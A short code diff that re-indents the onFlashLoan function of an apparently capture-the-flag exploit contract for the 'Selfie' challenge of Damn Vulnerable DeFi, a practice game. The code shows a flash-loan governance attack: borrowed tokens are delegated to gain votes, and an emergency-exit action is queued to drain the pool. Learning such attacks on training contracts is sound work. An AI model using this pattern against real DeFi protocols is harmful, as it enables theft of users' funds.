@@ -30,10 +30,10 @@ contract Exploit is IERC3156FlashBorrower {
     }
 
     function onFlashLoan(address, address token, uint256, uint256, bytes calldata) public returns (bytes32) {
-            DamnValuableVotes(token).delegate(address(this));
-            actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
-            DamnValuableVotes(token).approve(address(pool), TOKENS_IN_POOL);
-            return keccak256("ERC3156FlashBorrower.onFlashLoan");
+        DamnValuableVotes(token).delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
+        DamnValuableVotes(token).approve(address(pool), TOKENS_IN_POOL);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
 
